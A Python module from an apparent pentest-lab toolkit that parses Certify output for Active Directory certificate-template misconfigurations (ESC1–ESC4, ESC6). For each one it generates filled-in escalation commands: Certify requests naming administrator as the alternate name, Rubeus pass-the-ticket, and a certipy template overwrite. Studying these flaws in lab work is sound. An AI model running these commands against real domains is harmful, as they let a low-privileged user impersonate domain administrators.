"""
adcs.py -- AD CS (certificate services) ESC analyzer for an AUTHORIZED CRTP lab.

SOAPHound/BloodHound node data does NOT carry CA / certificate-template config,
so AD CS is enumerated with Certify (GhostPack) or Certipy. This module parses
`Certify.exe find` (text) output and flags the classic escalation templates:

    ESC1  ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU + no approval + low-priv enroll
    ESC2  Any Purpose / SubCA EKU + low-priv enroll
    ESC3  Enrollment Agent template (Certificate Request Agent EKU) + low-priv enroll
    ESC4  low-priv principal has Write* / Owner over the template object
    ESC6  CA has EDITF_ATTRIBUTESUBJECTALTNAME2 (enrollees specify SAN) -> SAN abuse

It reuses the Finding model from analyze.py and emits the same command-first,
screenshot-checklisted output. It never attacks -- it reads text you captured.

Usage:
    python adcs.py --enum                      # print the Certify/Certipy commands
    python adcs.py --certify certify_find.txt  # parse output -> adcs_findings.json
"""

from __future__ import annotations
import argparse
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from analyze import Finding, SEV  # noqa: E402


ENUM_COMMANDS = {
    "Certify (GhostPack, Windows)": [
        "Certify.exe find                     # 전체 CA / 템플릿",
        "Certify.exe find /vulnerable         # ESC1-8 취약 템플릿만",
        "Certify.exe find /vulnerable /currentuser   # 현재 계정이 악용 가능한 것",
    ],
    "Certipy (Linux/studvm)": [
        "certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable -stdout",
    ],
}

# client-auth-capable EKUs (cert usable to authenticate to AD)
AUTH_EKUS = ("client authentication", "smart card logon", "pkinit client authentication",
             "any purpose")
# principals whose enroll/control rights are EXPECTED (not an escalation)
# "administrator" (singular, RID 500) must come before "administrators" is moot since
# substring match covers both; included explicitly so the built-in admin is filtered.
DEFAULT_PRIV_FRAGS = ("domain admins", "enterprise admins", "administrator",
                      "schema admins", "cert publishers", "enterprise key admins",
                      "key admins", "enterprise read-only", "ras and ias",
                      "domain controllers", "\\system", "local system")


def _abusable_principals(block_text: str):
    """principal lines that are NOT default-privileged (i.e. a real enroller/controller)."""
    out = []
    for m in re.finditer(r"([A-Za-z0-9_.-]+\\[^\r\nS]+?|NT AUTHORITY\\[^\r\n]+?)\s+S-1-[0-9-]+",
                         block_text):
        name = m.group(1).strip()
        low = name.lower()
        if any(f in low for f in DEFAULT_PRIV_FRAGS):
            continue
        out.append(name)
    # de-dup, keep order
    seen, uniq = set(), []
    for n in out:
        if n not in seen:
            seen.add(n); uniq.append(n)
    return uniq


def _field(block: str, key: str) -> str:
    m = re.search(rf"{re.escape(key)}\s*:\s*(.+)", block)
    return m.group(1).strip() if m else ""


def _section(block: str, start: str, end: str) -> str:
    s = block.find(start)
    if s < 0:
        return ""
    e = block.find(end, s + len(start))
    return block[s + len(start): e if e >= 0 else len(block)]


def parse_ca(text: str):
    """Return (ca_fullname, ca_dns, target_domain, esc6_bool)."""
    full = _field(text, "FullName")
    dns = _field(text, "DNS Hostname")
    name = _field(text, "Enterprise CA Name")
    if not full and dns and name:
        full = f"{dns}\\{name}"
    # derive the CA's domain from its DNS host (mcorp-dc.moneycorp.local -> moneycorp.local)
    target_domain = ""
    if dns and "." in dns:
        target_domain = dns.split(".", 1)[1]
    esc6 = "EDITF_ATTRIBUTESUBJECTALTNAME2" in text
    return full or "<CA>", dns or "<ca_host>", target_domain or "<target_domain>", esc6


def _tpl_blocks(text: str):
    """Yield template blocks from the 'Vulnerable Certificates Templates' region."""
    idx = text.find("Vulnerable Certificates Templates")
    region = text[idx:] if idx >= 0 else text
    # split so each block begins at a 'Template Name' line; keep preceding 'CA Name'
    parts = re.split(r"(?=\n\s*Template Name\s*:)", region)
    for p in parts:
        if "Template Name" in p:
            yield p


def classify_template(block: str):
    """Return list of (esc_code, severity_key) that this template matches."""
    name_flag = block
    esc = []
    supplies_subject = "ENROLLEE_SUPPLIES_SUBJECT" in block
    sigs0 = bool(re.search(r"Authorized Signatures Required\s*:\s*0", block))
    ekus = (_field(block, "pkiextendedkeyusage") + " " +
            _field(block, "mspki-certificate-application-policy")).lower()
    has_auth = any(e in ekus for e in AUTH_EKUS) or ekus.strip() == ""
    is_agent = "certificate request agent" in ekus
    any_purpose = "any purpose" in ekus or "subca" in ekus

    enroll_sec = _section(block, "Enrollment Rights", "Object Control")
    ctrl_sec = _section(block, "Object Control", "\x00")  # to end
    low_enrollers = _abusable_principals(enroll_sec)
    low_controllers = _abusable_principals(ctrl_sec)

    if supplies_subject and has_auth and sigs0 and low_enrollers:
        esc.append(("ESC1", "crit"))
    if any_purpose and sigs0 and low_enrollers:
        esc.append(("ESC2", "crit"))
    if is_agent and low_enrollers:
        esc.append(("ESC3", "crit"))
    if low_controllers:
        esc.append(("ESC4", "high"))
    return esc, low_enrollers, low_controllers


def _esc_meta(code, ca, tpl, target_domain, ca_dns):
    """commands / why for a given ESC code (values filled from parsed data)."""
    if code == "ESC1":
        return {
            "why": "템플릿이 ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU + 승인0 + 저권한 enroll "
                   "→ 임의 사용자(DA/EA) SAN으로 인증서 발급 후 그 사용자로 인증.",
            "cmds": {
                "Certify request": [
                    f"Certify.exe request /ca:{ca} /template:{tpl} /altname:administrator@{target_domain}"],
                "pfx 변환": [
                    "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out esc1.pfx"],
                "Rubeus asktgt": [
                    f"Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:<pfx_pw> "
                    f"/domain:{target_domain} /dc:{ca_dns} /ptt"],
            }}
    if code == "ESC2":
        return {
            "why": "Any Purpose/SubCA EKU + 저권한 enroll → 어떤 용도로도 쓸 수 있는 인증서.",
            "cmds": {"Certify request": [f"Certify.exe request /ca:{ca} /template:{tpl}"]}}
    if code == "ESC3":
        return {
            "why": "Enrollment Agent 템플릿(Certificate Request Agent EKU)을 저권한이 enroll 가능 "
                   "→ EA 인증서로 특권 사용자 대신 client-auth 인증서 요청.",
            "cmds": {
                "1) EA 인증서 발급": [f"Certify.exe request /ca:{ca} /template:{tpl}"],
                "2) on-behalf-of 요청": [
                    f"Certify.exe request /ca:{ca} /template:<client-auth 템플릿> "
                    f"/onbehalfof:{target_domain.split('.')[0]}\\administrator "
                    f"/enrollcert:ea.pfx /enrollcertpw:<pw>"],
                "3) asktgt": [
                    f"Rubeus.exe asktgt /user:administrator /certificate:onbehalf.pfx "
                    f"/domain:{target_domain} /dc:{ca_dns} /ptt"],
            }}
    if code == "ESC4":
        return {
            "why": "저권한 주체가 템플릿 객체에 Write*/Owner 보유 → 템플릿을 ESC1형으로 수정 후 악용.",
            "cmds": {"수정(Certipy)": [
                f"certipy template -u <you>@<dom> -p <pw> -template {tpl} -write-default-configuration",
                f"# 이후 ESC1 요령으로 request /altname"]}}
    return {"why": "", "cmds": {}}


def analyze_certify(text: str):
    findings = []
    ca, ca_dns, target_domain, esc6 = parse_ca(text)

    # ESC6 is a CA-wide condition
    if esc6:
        findings.append(Finding(
            fid="ADCS-ESC6",
            technique="AD CS ESC6 — CA allows requester-specified SAN (EDITF_ATTRIBUTESUBJECTALTNAME2)",
            crtp_topic="Domain/Cross-Trust Privilege Escalation (AD CS)",
            severity=SEV["crit"],
            targets=[ca],
            evidence=[f"CA '{ca}' has EDITF_ATTRIBUTESUBJECTALTNAME2 set — any enrollable "
                      f"client-auth template can specify an arbitrary SAN"],
            commands={
                "Certify (any client-auth template)": [
                    f"Certify.exe request /ca:{ca} /template:<enrollable_clientauth_tpl> "
                    f"/altname:administrator@{target_domain}"],
                "asktgt": [f"Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx "
                           f"/password:<pfx_pw> /domain:{target_domain} /ptt"],
            },
            verify=["CA 플래그에 EDITF_ATTRIBUTESUBJECTALTNAME2 확인",
                    "enroll 가능한 client-auth 템플릿 식별",
                    "발급 인증서로 특권 사용자 인증 성공"],
            screenshots=[f"Certify find 에서 '{ca}' UserSpecifiedSAN 표시 화면",
                         "altname 지정 request 성공 화면", "asktgt /ptt + klist 화면"],
            report_notes=f"CA '{ca}' 레벨 SAN 악용(ESC6). 2022 패치 후에도 플래그가 켜져 있으면 유효.",
            priority=9,
        ))

    for block in _tpl_blocks(text):
        tpl = _field(block, "Template Name")
        escs, low_enrollers, low_controllers = classify_template(block)
        for code, sev in escs:
            meta = _esc_meta(code, ca, tpl, target_domain, ca_dns)
            who = low_controllers if code == "ESC4" else low_enrollers
            findings.append(Finding(
                fid=f"ADCS-{code}-{tpl}",
                technique=f"AD CS {code} — template '{tpl}'",
                crtp_topic="Domain/Cross-Trust Privilege Escalation (AD CS)",
                severity=SEV[sev],
                targets=[f"{tpl} @ {ca}"],
                evidence=[f"{code}: template '{tpl}' on CA '{ca}'. "
                          f"악용 가능 주체: {', '.join(who) or '(저권한 주체 확인 필요)'}"],
                commands=meta["cmds"],
                verify=[f"현재 계정이 {', '.join(who[:3]) or '해당 주체'} 에 속하는지",
                        "인증서 request 성공 여부",
                        "발급 인증서로 특권 사용자 TGT 획득(klist) 및 대상 접근"],
                screenshots=[f"Certify find /vulnerable 에 '{tpl}' {code} 조건 보이는 화면",
                             f"{code} request 성공 (인증서 발급) 화면",
                             "asktgt /ptt 후 klist + 대상 DC 접근 화면"],
                report_notes=meta["why"],
                priority=7 if sev == "crit" else 10,
            ))
    return findings


def _read(path):
    with open(path, "r", encoding="utf-8-sig", errors="replace") as fh:
        return fh.read()


def main():
    ap = argparse.ArgumentParser(description="CRTP AD CS (ESC) analyzer — parses Certify output")
    ap.add_argument("--enum", action="store_true", help="print AD CS enumeration commands and exit")
    ap.add_argument("--certify", help="file with `Certify.exe find` output")
    ap.add_argument("--out", default=None, help="output dir")
    args = ap.parse_args()

    if args.enum or not args.certify:
        print("# === AD CS 열거 (authorized) — BloodHound엔 없음, Certify/Certipy로 ===")
        for section, cmds in ENUM_COMMANDS.items():
            print(f"\n## {section}")
            for c in cmds:
                print(f"  {c}")
        print("\n# then: python adcs.py --certify certify_find.txt")
        return

    findings = analyze_certify(_read(args.certify))
    findings.sort(key=lambda f: (f.priority, f.fid))

    here = os.path.dirname(os.path.abspath(__file__))
    out_dir = args.out or os.path.join(os.path.dirname(here), "output")
    os.makedirs(out_dir, exist_ok=True)
    with open(os.path.join(out_dir, "adcs_findings.json"), "w", encoding="utf-8") as fh:
        json.dump([f.dict() for f in findings], fh, ensure_ascii=False, indent=2)

    print(f"[+] AD CS findings = {len(findings)}")
    for f in findings:
        print(f"  {f.priority:>3} [{f.severity:>8}] {f.technique}")
        for ev in f.evidence:
            print(f"        - {ev}")
    if not findings:
        print("  (취약 템플릿/ESC 조건 미매칭 — Certify find 전체 출력 수동 검토)")
    print(f"[+] -> {os.path.join(out_dir, 'adcs_findings.json')}")


if __name__ == "__main__":
    main()
